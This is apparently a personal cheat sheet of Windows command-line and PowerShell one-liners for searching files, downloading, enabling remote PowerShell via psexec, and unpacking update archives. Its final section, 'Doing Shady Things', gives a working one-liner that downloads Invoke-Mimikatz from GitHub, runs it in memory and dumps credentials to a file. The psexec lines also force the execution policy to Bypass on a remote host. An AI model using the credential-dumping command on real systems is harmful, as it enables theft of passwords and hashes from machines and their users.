# Command Line Kung-Fu
Some things I've picked up over the years.
## Parsing Stuff
Literal string match recursively from the root of the C: drive:
```
findstr /pinsc:"somestring" C:\*.txt
```
RegEx string match recursively in all text and xml files:
```
findstr /pinsr ^some.tring *.txt *.xml
```
## Downloading Stuff
Like wget for older versions of PowerShell
```
(New-Object System.Net.WebClient).DownloadFile("https://www.contoso.com/file","C:\path\file")
```
Or wget for newer PowerShell
```
Invoke-WebRequest -Uri "http://www.contoso.com" -OutFile "C:\path\file"
```
## Doing Stuff Remotely
Enabling PsRemoting Remotely :-)
```
$NaughtyComputer = Read-Host "Please Enter The ComputerName:"
psexec.exe -accepteula -s -h -e -d \\some-hostname powershell.exe "Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope LocalMachine -Force"
psexec.exe -accepteula -s -h -e -d \\some-hostname powershell.exe "Enable-PSRemoting -Force"
Enter-PSSession -ComputerName $NaughtyComputer
```
## Doing Things Iteratively
Getting  all the .msp files out of your windows Update .cab archives
```
Get-ChildItem -Path C:\Windows\SoftwareDistribution\Download\*.cab -Recurse | Select-Object -ExpandProperty FullName | ForEach-Object {expand.exe $_ -F:* C:\Updates\}
```
## Doing Shady Things
Dumping Some Creds
```
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1');Invoke-Mimikatz -DumpCreds | Out-File "$($Env:TEMP)\output.txt"
```